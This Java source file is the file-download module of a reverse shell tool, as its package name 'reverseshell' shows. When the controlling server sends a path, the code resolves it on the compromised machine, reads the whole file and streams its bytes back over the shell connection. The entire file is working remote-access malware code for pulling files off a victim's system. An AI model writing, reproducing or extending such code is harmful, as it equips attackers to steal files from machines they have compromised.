package obs1d1anc1ph3r.reverseshell.utils;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.util.logging.Level;
import java.util.logging.Logger;
import obs1d1anc1ph3r.reverseshell.ServerConnection;

public class FileTransferService {

    private static ServerConnection serverConnection;
    private static final Logger logger = Logger.getLogger(FileTransferService.class.getName());

    public void handleDownload(String filePath, String currentDir, ServerConnection serverConnection) {
        FileTransferService.serverConnection = serverConnection;
        File file = new File(filePath);
        if (!file.isAbsolute()) {
            file = new File(currentDir, filePath);
        }

        try {
            file = file.getCanonicalFile();
            if (!file.exists()) {
                serverConnection.sendResponse("Error: File not found at " + file.getAbsolutePath());
                return;
            }
            if (!file.isFile()) {
                serverConnection.sendResponse("Error: Path is not a file: " + file.getAbsolutePath());
                return;
            }
            if (!file.canRead()) {
                serverConnection.sendResponse("Error: File is not readable: " + file.getAbsolutePath());
                return;
            }

            byte[] fileBytes = Files.readAllBytes(file.toPath());
            serverConnection.sendResponse("file download");
            sendFile(fileBytes);
        } catch (IOException ex) {
            serverConnection.sendResponse("Error: Unable to process file at " + file.getAbsolutePath() + " - " + ex.getMessage());
            logger.log(Level.SEVERE, "Failed to process file", ex);
        }
    }

    private void sendFile(byte[] fileBytes) {
        try {
            if (fileBytes != null && fileBytes.length > 0) {
                serverConnection.getDataOut().writeInt(fileBytes.length);
                serverConnection.getDataOut().write(fileBytes);
                serverConnection.getDataOut().flush();
            } else {
                serverConnection.sendResponse("Error: File is empty.");
            }
        } catch (IOException ex) {
            logger.log(Level.SEVERE, "Failed to send file", ex);
        }
    }
}
